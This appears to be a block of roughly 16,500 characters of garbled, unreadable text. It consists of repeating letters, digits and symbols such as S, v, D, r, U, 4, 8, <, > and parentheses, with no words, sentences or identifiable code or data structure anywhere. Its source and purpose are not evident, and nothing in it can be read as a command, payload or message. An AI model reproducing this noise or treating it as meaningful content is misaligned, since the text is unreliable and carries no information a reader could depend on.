c<S(cv(Dr>D-U-SS cBic18vrU1Stv>v> S-8^g(1IUvStvSI S4v />IU>SD-UUU 8r(tIrvU(-4vD UMcU(1rPDUUScvt-c4 44IDIt8rt1 UctvU4v1 (WU>St4N IBt4-4D-sUIS>vtvv:94I11>DIvS(v4 D/-4c4(>r>-1Uvc8 HrrD1U>cU8UF(1 t c4v8r>1UtS-SvSR=I(t1Ur8UKSIvDv-184(GI>1--Svv( r 1--1vr(U4DDvU co83dUD>U4cS84r 1+U4S48 rU1ItvS48.r411>11c8-z1I DrS481.>4>>t-vvD(=4=>1->vU U4tD U>v48_4>DUUSSS8IrK1tU1St UrS1v>v-- 4TU1>D-SS8v& IADvS18>BU4 >v-vvy 48(>>-tvS(v4 Dv-4c48S4UDUUvS- a44D1>>SI SrS1 t c48vr>4U>(Sv8v#HIPt1-88U SIt> - 84J4I>1U-SSv(44sD:-1v1(U.vDv> cI(444D>U>cS Ur 1941cI DrU1-tvSv8P(4((t>St8SncI D8S4v>vvIUD8-vcI(eIr>1-DvU(>8 D8UGv48-4>DtUScU-Jr(D4U11z Ur-1v>vII 4rI1>>ISS8v7 r. 1S18DBUI->v->v! 44>>>-tvS(c4 Dt-4S1 >4UD-Uvc8 X*4D1>>S  Src1 t(c4v>r>I>t1Sv8v:arOt1S>8U S4c> - 84!4I>D>-ScS(I4VD(-1cD(U4SDvtv(S(4rHD>trcS vr I tvc1 rrU4DtvS 8,(yIUt>S48S 8I >)S4v4(-IU>I-vv-(iI4>1U1ct(S41D t>v4(14>1>UUcv DrY1>U1c> UyU1Ut S> 4(D1>tUSSvS11IE>tS181fUIS>vUvK>f44U>>U1vS(v4 1 ctv1 -4U1cUvc  33*1(U>SS S(81 t6c4 1(S1UtUSvvzNEI.t1->v8)SIc> t 84g4I>>UU1vv(84d>4-1vD(U4SI(U c (441D>U>cS vm11Tt(c1 >rU1Utvt S1rr1rt>S48SP4I Iy>S8I=IIU>t-vvt(544>4->v>(Sh8D U8v4v1rzDUUUcv8Ar64(U1S>vvrS1ct -r 4r41>>>-88v!vI*D8S18>?UrSDr- v 04I4>>tvvS SrcD&U v1884UDSUvc (t44D4U>c1 SrS1 DhSr 1r11UtUSvv>x}4:rSS>81uSrc> -g84&1ID>U-Uvv(S4%D#-1S>8v4SDSU c (4XvD>t>S  vrS1*>tc1 >rU1S>rS 8 r4IHt>S>8S vIU>K-d81*1IUD1-vcv II4DJ->S1(S4vD U{8v(14rDUU-cv  rmD4>Sc> 1rS1tt Sf 4r1I1tUSU8vG IBtrS18>(IIS>S- vz24II>>-Ucr(v4cDZ-4v1(14UDSUrc  v44D1U>c> S v18t9S  1o<1U>#SvS 8U1r>kS>8DdSID> Uucu51II>Utcvv(S4LI4U>v>(D4S1 U SE(4r1D4UUcU v((19t(c181541St-S vcr411t>UU84=vIc>e-(81 SIUDU-1v (cI41c->vU(S4v>DU2c((14rDUUUcvv rtD4Urc> DrSI1t - UUr11rtUU-8vF IVt4-(8>FDIS>t- v P4r1DU-Uvt(v4cD:tSv1 1Y_DSUtc 8D44D1U>cU8Irv1ct5S8 1r11UDSU(8 _814trS>v4LS4S>4-)v8Y1r4>U-Svv( D>>4U v>(>4SDvU cTE 41DrUUc1 vr 1yU4SI >rD1StvS 8(r4I4tISU8t#v4->aS481 >4v>S--v (8I4Dv->SU (4vDcUfc((1r8DU>Scr  r8D4Urc>vUrS4v>US*8(r11ItUS-8v  4:t4Sr8>zDIS>r- v*(>I1>I-UvU(v48DHU t>(D4UDS4Ic  (4414Z-cU -rvIrtYc4 1r>> tSSS8 _P14t1S>8U( Iv>8-0v=%1ID>U-S>1( 4O>4-Iv>(U4SDvU c6(4411 UUcS vr IfU4c1 >8t8DhUI(c;vv I01IccSvSv((84(>(-IIU>1-vv (? ((D4U>4-rvDD UIv4(14>LD4D1XU-c88 >1t1t-St8-r-I8 4ZT1>tUSS>DS88t( S18r}UIS>vD4DcUlcc(r-UvI(v4 DM4cD(U4vr(Dr 1U Rr8D1U>cUtSc- 8r11> 1r11UtSSvt(v-4vt1S>8U(Uc(> -V84(NI>>U-SvvID4Z>4-1vD(U4UDvUU8-(441D>UIcS cr 1(U4Sm-Urt1StvS-8Prr11t4DS8-^vI DcS48I+>4> 8-vv (,4v>1->vU(S>ID Uyv4(I4>D>US-vS-rND4U1c> UrU1vD >c 4r11>tUSS8cM ISUcS18>wU4 >v-8v,2rI1>41Sv-(v4 D1-4vI(>41gvUcc  ,44D1UDcU8U-(1 tMc48vr>1UtSUv--p<14t1S>8U2tIv1U+184p1I>>U-Svc( 4c>4UltU(t4SDvU cE(r4111yccS vr 1-U4c1 >r44rtcS88pr411tDSU8-&vI cUS481X>IU>S-vv (g4>>1->vU(U4vD8UPc S>4DDUUScv  r(D4U11  UrS1vt8SE 4r11>ttSS8vB _ot4S18>&D> 8DUt>3DI}-cZDUvS(D4 Dz-4D8-rc1(I4t12tSr(Mc >vt9cIU1 -t(I r4 - SDU8rc1cvcI>S>84ySIv> D8>>-c8r(S4>v-4tJcD c1(cr1UUr U c-(441D>IU1 UcSD cf{1r IUccccS1(+vUD-SIUSU8>PvI >n4ctI-8v1>S->v (CI4^DIttc--vI NUgc8(14>DUI>DItSc1 8U1Sc UrS1vIt1c> 8r8 B(I tU-v8cB1S18rTUIS>vDr>r- v((S-UvI(v4 DY18D>-Dv>  4tDS ortD1U>cU- S8 cr(1>-1SS tgr1t>va.I(t1S>8U-v8t(t-8S-1 D-u-M4r>cU X>4Uhv>(U4S3-4D1>U841DIUUcS v8D881rc1 4rU1Stv>rt(S-8>t>S18SjvI %-1r>tSrIU>r-vv (l DkI4(DS-rcU -4vD8(r((11>U8vI SSS v1c>8(rS1vt DrUIv(8UrII8tIS-v8t4-18>7UIS4c4-Dv-Ir1r7ItDUU(_ r 4IDrUIvI tUvcr #44D1IIDIt ct cav-4S4St8DNt1t>c6CI t1S>8Uc>8t(>4v84(cI>>U-SDDU(c (t4rD>-tvt(tU cS(441D>1D1ct cU trcc18irU1Stv>c-S-k IQ-1I8SstI >hS4UU-rv>(r4tv (cI4>1->DU--vI vr8v4 v4>DUUS>vt(S8 -A!18t-Sv1-r!I844-Dtc-1QUr o I t4S18>c1 S>v-DvPz4I1r II>-UJcS(U1M>IU14DDSUvc  x44D1t>tU S0v1 t6c4-vSr8cr-I >(St8 44It>--> vH84 D nrI>>U-Svv( 4Pt4DDv>(>4SDvU >rSc411(UUcS vvU cr(IsttS>rtt-S 8jr411t>SU8SvvIc>VS481:>IUrSrUU (d41>1->vUc1vI i4vtvUcc1 Dr>t-U>ct >rGc>8(rS1vt >8tScI81rt1t>US-v >(DcI>rtDcUU-  tvIIrDrI4-U(vc1>US(BD(D4U(vUvc  )xbc8U>cU S(v1 t:c484Q11Ut-Svv-/214t1U>cc3SIc> -(84 UI>1UUcvv(84{>r-1cv(UCS11U c((44ID>>}cSvvr119Urc1 DrU1DtvU 8Sr41It>St8S(*I >PtS81XDIU>U-vv (5I41-->vU(S4vD U v4 f8UDtUScv-Ir_DrU1->8UrS1tt Sv 4Br1>>>8n8v?tI=>DS18>=UISDI- vc!448>>->vS(>DDDsU8v1-c4UD-Uvc  Jr x>UDcU Svr1 t(c4v1#>1UtDSv8SHEr>t1-10 9SID> tv8431I>>UUrvv(-47Dc-1v1(U41tDU cc(4#(D>UtcS cr 1vI1cI >rUIDtvS886/ (>tDSU8ScrI >(S4c1vrIU>D-vvS(L# >1t>1D(S4tD Ucv48_4>IU>Bcv -ra18U1Sc U(SI-t Sc 49(1>D8SSvS(8IW>vS1cIVUIS>vUvvcd448>>tSvS(v4 IX-rv1 (4UDIUvS  &AAD4U>SN Src1 tEc4841Y1UtrSvv8l.14t1-1vv:SI4> U-84P1I>D>U vv(I4AII-1v>(UrU1DU c1(4rVD>UUcS8Srv1_tDc1 IrU1Stv-v8-r4I>t>U>8SYvI D -481(tIU1I-vv (9rY-S->cU(S4>D UYv4 4DvDUt-cvcXr&D4U1S1IrrSISt SU 4r11>>>U88v(cI61IS18>%UIS>r- v-G44r>>-UvS(v4>DGUvv1(>4UD-Uv-U -441(U>D8 Src1 >rc48kvU1ttSSvUI^<1rt1U>-I.SI>> -v848 I>1Ut-vc(U4NDv-1c1(UrUD4U c-(4(cD>UUcSvvQ!1Etcc18(rUIStv-vv1r4Ivt>UI8S9vI D UU81(8IU1D-vv (2r{1S->c (SJ4D Uav4(1r DUUIcv 1r.1?U1SGrcrS1>t t- 4rI1>trSS8UcAI(t4S1-(/UI->v-SU4yrI1>>I8vS(c4 I<18v1 H4UD>Uv-U l=4((U>c4 Sr>1 D(c4846U1UtISvv-hG14t1U>v(=SID> --84(8I>1UUcvv(t4ADc-1ct(U+S11U c-(4r8D>DccSvvrU1=tcc18(rU41tvU vcr4I8t>Sr8S cI >k118I()IU>1-vvt(kr4r(->v4(S4>D tSv4v (>DtU1cv-Ir3DrU1Uc Ur>( t8Sn 4c-1>ttSSvS-rI<>vS1v8OUIS>v- U-Lr4 >>-tvS(c4 1 Uvv1 P4UItUvc  Kj4DrU>cr SrU1 DSc4v1(c1UtISv8t6L41t1S>8rCSI1> -.84#1I>>UUtvv(t4+Dc-1c (U4SDSU cS(444D>UtcS8S8c1(tvc1 1rU1StvS v r4I t>St8SKSI 1!-r81(5IU>1-vcr(lr4D1->v4(S4>D ttv4  41DUU1cv-IrjDrU1c> Ur>( t8SV 4c-1>ttSSvS-rIC>vS1S 0UIS>vt Uc244 >>-4vS 44 IS-rv1 {4U*1Uvc8 MwID1U4>S -rv1 4Sc4 Ir>114vSc8 Hy tt1SD8U S(t> -S84(CI>11-SSvc-4jDv-1c%(UrvDv>Uc((4r D>48cS cr r7U4Sz-Urt1StvDI8frr11t4DS8-HvI 48S48I%>I4DU-vv (94U>1-DvU(U4vDS14vr(14>1 UScc  r7 SU1c> Ur-1vt Ss 4r11>tUSS81A IMt4S1v-OUIS>vD4>t-cvv(4tUU--Uvr(trN>IUS4UDUUvc  lvIw8U>cI Srv1 a&1(UISS8vtSSU8 a_14(81D>(->IvD -_84C1(D(I4>D88  S;r44D-8U U 8rc18U8crD>tccS vr (8r81UUrcD8>Dv>vtr-(8rrrID8So>I >HS4-r-tvS21II>t(b4c>1->vU-Ivt S4-D8U>S314UScv  Z 8DU1c> Ur>1vt S/ 41c1>tUSS8cQ I t4- (8,UIS>vU-v9WrI1>>-Uv>S 48Dd-4S((>4tDStS1r =44D1t cU Srv1 ctc4 1r>1ttSSS8  *(8t1S>8UFSIv>t-Oc4c(I>>U-Svv( 4c>4U 8((U4SDvUIc,(r41DDUUc>- r81.U4S- >rt1StUD,8(r411t>SU8-ev4v(IS481#>I>>S-vv 85 8>1->vU(S4vDUU<-v(I4>DUUSSv  r(D4UIc> 1vv1ct SL84r11DtUS>U a8IMt4S18>^tISDS4rvns4I1>I-UvS(v4UIt-rvI(>4UDSUcc  (44D1v cU Srv1 thc4 1r>IvtSSv8 f 14tIS>81cvIc> -#84G1ID>U-S>1( 4&>4-Iv>(U4SDvU8c}(4414>UUcS vr 1 U4c1 >c-^Itv- 8gr411IDII>>-8r 4S1r>4--rU4U48DcU8v8(r->c8(S4vD 11DI-rvD vIS1pU8St 8r4c> rrS1vt DSt8cr84^-IUS-Tc 8>vrc8tg8>48SD{vX(SI1>>-UtSU8cc(tr DcUtcSDSUIc  Z4488rt1>t(S-8 r(1(t(rI1UtSSv8 6Q14>1>>8UxrIv> -kUS-(8D(v4>>1cvv( ?-r8(sIt(I8 8SUD- >DIv>> rrD(4  vx-4>rU1DtvS 8{vD8Dr41I> ^-I >KS4816> U >Dvv (SI4>1->UDU vI(-441 (r4>DUUScv  reD411cI X(OI4t (4U>I-UttU-S8v5 Ia4S4(>-Stvv(8ID>vS=vD(t41tS-ccv v-4cE(>4UDS4DD8UIc8D1t(cU Srv( r1Dr>ccr8>wtSv8D_&14t11tt-vDv O-II>--(vI>U-Ivv( 4M(c4(D4-rvD  rUc5  41D>UU1IUccD8vU4cr >rU1SIIIc-(rr11t>S48S:vI rr1IUtSDv((v--rU/Ur >1tI4SD->vDc-USU8S4>-S4  rS(r8(crI r1-r(t1 vt48(Uvr(rUvSt 84(1I4S184jUIS>vDr>(--v>>>U(vS(v4 rIIrD8UUc( >rtDSUc441>U>cU S8> Dr41 - S88>+tIU-cSU8-pU148UOUIv> -_t c1I>D(-Svv(  8(SIID1-tvt U4-1 (4r D>UUcSS-8U8 4r1tUrrD1StvS 82r411U>>-8SWtI >aS4tT-8v1( Itvc 1cIUr8>  #DScrbUKc (14>DUItDIt1ccD4t8c> UrSXt;{1(tnSU rr1SS8ri I3t4D8tr-1(t!1ID>1- v4+r4SvS(-4 Dy-4D>-rcrDSUtc  ^44 14D1(tUS-1 tIc4 1r>(vrr1Dt>-v44II14>cSrvSu8I184(EI>>U-StU--cU  -rSZ/4&-(v(#8I&>>DD>U4cS vr H8rI1>tNS( ItvSr8sr4114I1I> St8c(vU4-4-tvD(tItDcSrI4>1->c>>I4vD Uj-t(14>DUtUS{  r(D4t4c> UrS4vtDS7 rr11DtUSI8v  48t4SI8>HtISDI- SM(cI1>D-Uv-(vrSDgt4S8(>4tDSUcc  444I1U4cU -rv18tBU- 1r>r5tSSc8 M 14t1S>8U (Iv> -s8431I1>U->t (84e>4IUv>(t4SIvt c, 841D4UUSI vsvU>U4S8 >%v1StvS 8e(-11trSU8I/vIv>E-v 8z>II>SUvv ((I4>I->v1Sv4cD UVc4(14DDUU>>  8rsD44Uc> trS4v> Sl88r114tUUS8v(vt>t4-88>((IS>v- vN -I1>r-UvI(v4vDTUv c(>4IDS4Xc  (44D1U>c1-vrc1 t^D> 1rD1UDS>t8 *c14>3S>v(lSrv c-Pv8P1Ir>Utvvv8 rc>4U(v>(I4SItU -}8c41DrUUcD v(r1j>5c4 >r41SDcS 8dr4I4>USU8I?vrc>{S481 >rz>S-Dv (-I4IS->c> r4vD>UVct(14>DUtU(>  rtD4>tc> UrSISt-S{8Ur14vtUSS8v(vI8t4--8>8SIS>v- c (-I1DS-US1(v4 DbtNvI(>rcDStrc  74414>ScU8vrv1-t/c4 1?14 tS-88  v14t1S>v>I2IvD -Tc>s1I>>UUU24( r(>4U1v>(U4S1S8tcB8w411vUUcS vnvI-U4Sr > S1StvS 8j(v11>(SUvt2vI >;S4v>3>I4>S-vv ((I4I UkvU(D4vZ4U<vr(1(SDUU>>  8r.D44Uc> trS4vI-Sn8vr114tU--8v  r(tr- 8>X4IS1D- c  UI1D(-Uv>(v4 D)t4cD(>4rDSUDc v>4414tvcU 4rv1>tpc4 1%11ttSSI8 uU14t1S>v>}-Iv>1-{vI01I>>U-Sv1( 4->4USv>(>4SD>vrc6 v41r(UUc- vrt1lt >> DrU1S1DS 8(r4IY4USt8S^v 4>ESr81 >(I>S->v (vI4DI->SUSD4vDUUscv(1rADUtU-y  r-D4t4c> UrS4v>8S_8cr1I(tU-t8v  4Ut4-88>_rIS>-- SZ SI1D(-UvI(vdvDGt4vr(>4rDSUDc 8(44I1UIcU Irv1tt2Sv 1r> St-S>8 KS14>8S>cUvDIv>U-Qvvy1rt>Ut1-v(84S>4IUv>(t4S1(U cvS14ID>UUD  vr81C>lIt >r41S>>S 85r4114(St81gvI8>PSr81(14c>S->v 8(I4>1->SU(D4vDtUfc (1rDDU>SSr  r-D4t8c>vDrS1v>1Sm8Sr11>tUSS8v_ ISt4-88>LrIS>1- v_(II1D_-UvU(v48D*t2Uc(>44DSttc  F44D1trcU 1rv18teSJ 1(>48tSS>8 dS141DS>cU.IIv>U-YvvZ1I1>U-1vD( 4S>414v>(t4SDcU cvS14ID>UU>U vr81At >> DrU1Sr%S 8(r4I4(-SU81MvI8>mS481 >(I>S->v (SI4I1->S4(-4vDUU{>c(14DDUD cv S84DrU1c>-rrS1ct Sv-1rI1>tU1 8vx8I}D4D(8>a4IS>U- vtC4r14r-Uv1(v4UD&>Sv1vZ4tDSU>c -144DIU>-s SrU(%t(c4 1cS1Ut-Sv8Sv41rt1S>-DVSIc> -ScON1I>>UU_vv(84!DH-1v4SS4-DvU c>(44ID>UUD4 vr 1#Urc1 >rU1StvS 89r4I(t>SU8S5vIU>{S481vIv-(vI>>D--I4D8->vU(SvD(-rvDcU(cU 4USS   rGD44(1>U1c-8Ur-DrU(S(84!11r> StIh>US18>)U(-(t4S>r 4(I(14(Dt-t4 DS-4v1(>8c rI D8UIc81SU>cU SyS Ut(cr 1r11UtSSv8 OS14tIS>8t!SIS> tfv-61ID>U--vv(845D4Urv>(t4SDUU c+(4r41-UUc- vrc1KU4c181_81StSS 8 r411t>SUvIOvIv>VSr81b1IU1SDtv ( I4>4->vI(S4vD4Uuvr(141DUU-cv  cUD4U1c> trS1vt S( 4r11>tUS48vm I6t4->8>6UIS4c4-Dv-Ir1r_ItDUU(9 J IrD>Uc4UDDUvc  7c4(r4D1vt rv1ttbc4 1v>8vr-1-t-vt8 t1S48U9SIv(tI(>-UEII>U-St  UNtI1ctU1(U4IDvU cJUcc( 44rDDt SU1mtvc1 >rUJtK8IJtSS-88t>S18S}vI e-1r>tSr4r>S-vv   cD>1->vU(>4vD UCv44c4>DUUScc  r D4t v( UrS1vt-SC rr11DtUS>U P8I^t4-(8>)tIS>U1{v(L4I11J-Uv-(vrv I-4v1(>44DSUvc  hD-D1U>cU -rv1vt2-4-(r>1UtSSv8 e-14D1>r8UXSIv> -p8rp14nUr-Svv( 41>4-Iv>(t4SDUIQc((4411SUUc- vrSK4Urc1 >rU1StcS v -D11t>SU842vI >;U4U(p>IU>S-vv (8I4I -DvU(S4v18UOvr(14rDUU>>  8rpD4tIc> trS1U4oS( 4r11>tUS-8v(vvIt4S18>Y>IS>v- vS8-II>D-UvS(v48D3-rv1(>>6DSUvc  544D1U>cU8 rv1 t?SB 1rD1Ut>D 88Ph14t1S>8t;SIv:>-b8401ID>U-Svv( 4(>4-1v>8c4SDvU c_ -41D>UUttU1c88 4rDrt4cI8UtvSD8Cr4114 1It--ZvSjUDutI-1IUDv-vv (l(r (44D-8S >(8r DD8181(trvDr  r-D4U1c>-US  cJD1c>sSr1>>USS8v6 (U(8IttD-SvcjIISt -IvD(41U>-UScSDTUtv1(>4Uh r8DcU(c>O1rSDttrct8vtiSc 1r>1UIDI t8S 8>:(148U01Iv> -PU(c v1Jt48>t( 44>4-1v>c4vr  4StSU-c4 Ir1ttU1cD 1r c1 rrU1Stv>rtrS 8(NSSU8rXvI >T4c>D-1v8(t4v>8-8v8>1-4vU(S4v(t4(DDU(4>1(UScv  vr(II(1UUIS8 Ir-I8 4T81>tUSSUvS48(3(I(U8S1IS>t- v_^4v1=D4(DUU-4 Dt-4v1(>8c(-4D1%UtS 8(44DI Sr>1 t*c4SrSt8Sr11Itt?(1rt1-^8UySIvV(1rUDSIv8(S-SvU( 4/>4r8>DU(c>DvU>co(441V>r-1tUISS trI1> >r>1StvS Uvv41rt>SU8S^#cc--+c-I)>Ir>S-vv --v8 :4(>IUvc>DcU<v4S>*w4(Dv8(Svr(D4U1cI UrS1vIDI8Srr1IctUSS8vvt8c( >r> -(v jU4v>c-1I1DG-UvS(v c(14-D(UUc1rUUvc  /JHc8U>cU SN81 tPc484!11Ut-Sv84Ef14t1U>vD_SIc> -(84(-I>1UU4vv(84J>r-1cI(UhSIAU c((44ID>tccSvv{>1TUrc1 DrU48tvU vSr41It>St8S sI >WtS81BDIU>U-vv (GI41-->vU(S4vD U v4 d8UDtUScvS(rwDrU1->8UrS1tt Sv 4(-1>>>8&8vWtIa>US18>PUISDI- vck448>>->vS(>1tD7U8v1 >4UD-Uvc8 _r _>UDcU SMv1 t(c48MvU1ttSSv-(Gb1rt1U>vU&SIt> -v84(cI>D>vyvv(t4.Dd-1v>(U4S1IU cc(4r8D>U>cS >1D1kt8c1StrU1-tvS 8ok (>tDSU8Sv8I >(S4c1vrIU>D-vvS(248>1t>tI(S4tD Ucv48(4>1>t>cv UrM1>U1c> U(SI>t SS 4n 1>t1SScv(8I9>vS1vXWUI1>vt cUu44 >>-4vS(c4 I0U8v1 s4UD1Uvc- KH41DU>c4 Sr>1 >cc4 1cU1ttDSv8-gsIvt1U>-I&SIt> -c84(1I>14-8vv(-4eI+-1vD(UrIDvUSt4(r41D>>>cS cr 1vI1cI >rUmctvS88j(4((t>SI8S6UI > S4c1vrIU>D-vv-(Y4c>1>Wvt(S4tD >-v4(I4>1>UScU-2r(D4U1U( Ur-1vtS>4 rr11>I-SS8c_ 4 (DS18rHU4>>v- v2,4 8>D-IvS(c4 D(-4c48-4UDDUvSU }44D1>>-8 Sr>1 tvc48(r>4UttSv8U%^Ivt1- 8ULS4D> --8401I>>U-Svv I4pDv-1cP(U4IDvU ct(4r(D>U>cS cr I I(cI rrUI4tvS 8xr44ct>SI8SfcI > S4c1(-IU>D-vv-(m4r>1t>vt(S4tD Ucv4(r4>D4tScv -rWrIU1cD UrS1vtS>4 rr11>I-SS8ca rN48S18r7UI>>v-vv6 4 (>>-IvS(t4 D--4- DS4UDDUvU1 74rD1>vcU >v 18tWc4SSr>1ttSSUUou(14t1>t8UE-IvDv4I84((I>Dv-Svv( fJr8-1vr(U4DDvtBcbvvUUD>UIcSS8r 1(U4-c >r1(vtcS 8H8I11tDSU8>c I8>6S4S8i>It>S->cv(NI4>1UvvU(-4vDvU%c S>4DDUUSc4  r(D4U11  UrS1vt8S0 4r11>tUSS8v; Itt4S18>/U4r>v- v7vrc((44-SSc>v8  4DS1UScS(14t1vU4vr U>>tDU-S-8Sr118 1V81UtSSv-8-cv KDU>-4S-vSbr-jvv%1I>>UIrDv-8vt K4rv>(44SDvU t8UIc> br(DI vrt1^U4c1t(cI8>rD1-t4-v11>rSU8S,v(8(c4 >D >(4K-4S>r8?8t111U>I--cS(-r81 81v-DUtScv  rxrr7(14t-(SJ>r8I tD(1:1Q-It>-S-v8t4->8>xUIS4c4-Dv-Ir1rFItDUU(K W IrD>Uc4U1-Uvc  F r8(r41-vS8> 8N 1Dv1848Ixv1Dt-Sr81DcS>8UwSIv1v-(84m14.>U-Svv v>>>4-Iv>(>4SDvU S 4U41D1UUc1 vr 1<>3I1 >rD1StDS 8&r4I4tISU8>JvID>gS481(1ID>S-tv (UI4>1->c>(-4vDUUQvr(14>DUUSSt  rAD4t c> trSIShrS2 rr11ItUSS8vJ >>t4S48>MUIS>v- v)8(II>D-UvU(v4cDZU t>(D4UDStUc  (4414X-cU 1rv1-t+c4 1r>t(tSS>8 V(14t4S>cUvDIv>U-avv01I4>U-S>c(84S>4U v>(I4SD>cDc. v4114UUc- vr 12t >> DrU1S>US 8(r4114tSU81YvI8>PS481o>4t>-->v ( I4>1->v4 U4vD8Udc>(14DDUUUcv S84DrU1c>8vrS1ct SR-Ir11DtUSS8vQ IRt4-I8DQtIS>S- vY,4I1( -UvS(v48Do-4v1(>4UDSUvc  (44D1U>cU Drv1 th14UrcD8v) SU8 )F14>44-8UzSIv>8-,84Q1I14g-Svc( 4a>4-1v>(Ur DvU c! /41DDUUcSU1r 1LU4cI >rU1StvS88Wr411DISU8SNvI >-S481P> U( IcDD-cc:(r->vt(S4vD Utv4 S4>DUUStStvct  r8Dr-ScD8U1vS}8Ir11>tU1>tc-S8(rCI(>---v>#tD-DS-8v>(4-Uv1(v4 Dn1(t U1vt 84tcc z44D1U>cU Srv1 tiS8 1r>1U4tIvt8--81t1-88UnSIv4rI(>c->v8(14D>U--48vS>D-tIU vr> U(Y(4rID>UUcS-Sc-8Er>1cUIct8>rt1SU8- 8D=11ttIStI >8S481P>vS9D4Dvc t8UI1->DD1v1Dr(U8v4(14>DUUScv(  rD4t1c> UrS_1,-1IUrS>8tp(1>US-(8r( D1tD->v>>-1r>II8I>814c4cIv4 DD-4v1(>8v c4-D8U184 U4DI(UDSS1cU>>rrtItc4(Dvt-(^6ISt1S>8UcSv8(cItD -cvt(S-SvD( 4b>41Dt>Srcc S44Dv(4r-D>UUcSS-c> (r118UrvD8SrcItt4r414t>SU8ScU  >T- 81;>IU44It>8-v4(>1->vU(S4vD U+U4(1rSDUUScv-tc( -3E>Mt-SU{-r>1tt>S?1ItUSS8vZ IgV4;8->^UI1>v- vFU8v>(>It>t-r4c48( (c-trUSt11t  .r-D1U>cUStc1 8E DrUrS4 IJUS- 1c(tD-D^HDI4Dt8> --84F1I>41IDD-USc (Ircv>  4SDvU t-U8S=7I4I1Ut>cD 8r8c1 rrU1Stv>->SS88>T4SU8>bvI >iIctI--8I>S-cv (YI4DS->c (S4vD 1SD-U4vrTD4D1StUcc8srSc> UrSISQrSb 4r11rtUSS8v  (ct4S18>JUIS>r- c IvI1>D-Uvr(v4 D6tTcv(>4>DStrc  54414> cU trvI(tjc4 1P111tSSU8 p114t1S>v>(SIv>--_vvl1I>>UUUc1( 4S>4UIv>(U4S1SU1ck c411TUUcS vFv(IUrSv >Kc1StvS v (S11>8SU81evI >/UR8I9>4 >St(v (#I4D4UvvU (4vDUUuv4(1r118USSW  r1D4U1c> UQE1vt Sl8>r111tUUSUtY I(t4S18>(>ISDS-8vL(nI11D-UvS(vK D1-4v4(>4>DSUcc vWrtD1U1cU UrvI t*-48 r>1>tSSS8 (114D1-U8U,UIv>v-hv1F1r>>I-SvS( 4 >4U4v>(UvvDcU8cz(r41D1UU-SStr 1(U4cI >g_1S> t18F(-11DcSU8-LvI8>M- U>xDIU>SUrv ((I4DE1Uvt(S4v(UUjvr(1r18cUScc  ((D4U1c>vUUv1vt8SN rr11DtUUSvIJ I(t4SI8>(UIS1vU>vzerI1>D-US (vh 1D-4vI(>4tDSt c 8 JUD1U1cU Drv1 tx-48(r>1>tSSS8 JD14>4-r8U_tIv>D-n84J141S4-SvU( rD>4-1v> >r8DvU-ci I41D>UUSU8cr 1SU4SU >rU1S>SSr8:.c11>wSU8S=v4v> S4vv:>4t>S-vv   4(>1U8vU(14vD UKS_ S4>1 USS(  r,D4t4 v U+(1vtUS: 4r1I1S SSvj: 4It4S18>(>D(>v-rv_(vI1>>-UcU(S4 D4-4cU(>4UDSUvS  grfD1tUcU UrvI >mc4 Ir>1ItSSS8 k#ISt1SD8UmSIv>8-H84(>I>>>-Svv( 4 >4-1cr(U4tDvU c_ p414>1vc- -r 4_U4-* > Ur4tcSc8_xc11>ISUvSgUI > S4vt)>ID>S>vcp(_4u>1t(vU8U4v1 tUv4(I4>1cUScS  G IDU1c1 U(-1vt SMv4(U1>t>SS8SE 4rt4-4vcxUI>>v-1vsA4I1>>-(vS(S4 Dv-4v4(>!U18Uvcv KroD1> cU8Uv41 tvc4 rr>1UtSSv8rOTITt1S48UMUIv1 -v84a4I>>>-Sc1( r 1c-1v4(U4>DvU cb(4rSD>U>cS Ur 1 U4-184rU1UtvSv8g (11>1-18S;UI D>S481g>IUU1-vv-(.Ir>1->vU(SrcD Uvv4 (4>DUUScv8trz1&U1c> Ur-1vt SD 4r41>tUSS8c; I:>1S18IRUIS>v-vv%j4r8>>-1vS(v4 D -4-1 U4UD>Uv-  j: D1D>tX -rU1 t-c48rr>IUtUSv8cg2IDt1S48U8SI>> -884 8I>>>-Scv r4^D{-1c-(U4tDvtvcD(44rD>>tcS vr 4)>Sc1 IrU1ttvU(8C(fI8t>SI8SW4I >{S481:8IU>t-vv-(%4Y>1t>c-(S4-D U8v48v4>1>4ncv -rk1(U1c> UrS4(t S8 46(1>t>SScv(DIh>(S18I_U44>vUvcI244(>>-1vS(v4 DHt-v1(I4UDDUvcv P94IvU>cD Sr-1 D8c484(c1UtDSvv1gG14t1S>( hSI>> - 84K1I>>Uc>vv(-4zDv-1v>(U4S1(U c8(441D>UtcS8SFc1_t(c1vDrU1StvU vcr41rt>SD8S;cI 1H-U816IIU>t-vc (br4D^->vD(S4-D t1v481{cDUUtcv cr{IvU1->8UrS1-t S8 4(>1>tU- 8vTcIN>HS18D_UI>r -8vV94vc>>-tvS ScrD)-rv1 r4UDSUvc r>44D4U>cU Srv1 t9S> 1rD1UtUSv88du14_vS>8UESIc> -+84#1I>>U-Svv(>4p>4-1v> 64SDvU tvU-cr(D4>1 UtcS1ktUc1 >rUVIrtISU8S884(YI(ttStI >IS481J> U( IcDD-cc;rrIID>-rcv Sr8vr(I4>DrUScv  vR >4II8UISU8-t St 4r11>ItID>U-((8L>IctI-8IS>r- vbO4 U(tID>-U68 (1Ir1c-rc>DSUUc  J44 84D1cUDr41 tWc484>D1UtSSv8>x{14t1U>vDWSIv> -M84T4I>D>U1vv(v4sD8-1v>(U4S1(U cA(444D>U>cSvvrv1JU4c1 >rU1ItvU v>r411t>SU8Si-I 1uU-81{>IU>S-vvc(Wr4D4->vU(S4vD USv4v144DUUScv 8rh1 U1c>88rS1vt S( 4r11>tUSS8vo If>SS18>wUIS>t- vB{4v1/IItD U&4 Dt-4v1(>8D(44c1vUD&4Ot4D1S S= 1 tMc4-rcr8vrD1->S f(DbDIU>D->8t(v-#vv01I>>UDtD8UovS(-48v>(r4SDvU D-U8Sp (4I1vt>r 1 U4c1 >c-nItvSS8Fr411((1ttr-UI >tS481K>(t(D4UD(8Q v!I41Dc 14vD UnS_tt4>DUUScD  ruD4U1 8 UrS1vt8S,8Tr1Ia-(SS8vC 4ct4SI8>{UIS>U17v(!4I1Dr-Uv-(vrv I-4v1(>4IDSUvc  6D-D1U>cU -rv1vtd-4-(r>1UtSSv8 &v14D1>r8UiSIv> -QvSN14FUr-Svv( 4D>4-Iv>(t4SDUIjc((4411cUUc- vrS!4Urc1 >rU1StcS v -D11t>SU81ZvI >=U4U(5>IU>S-vv (8I4I -DvU(S4v1 U_vr(141DUU>>  8rED4t1c> trS1U4wS( 4r11>tUS-8v(vvIt4S18>mtIS>v- vS8-II>D-UvS(v48DF-rv1(>>bDSUvc  :44D1U>cU8 rv1 t+Ss 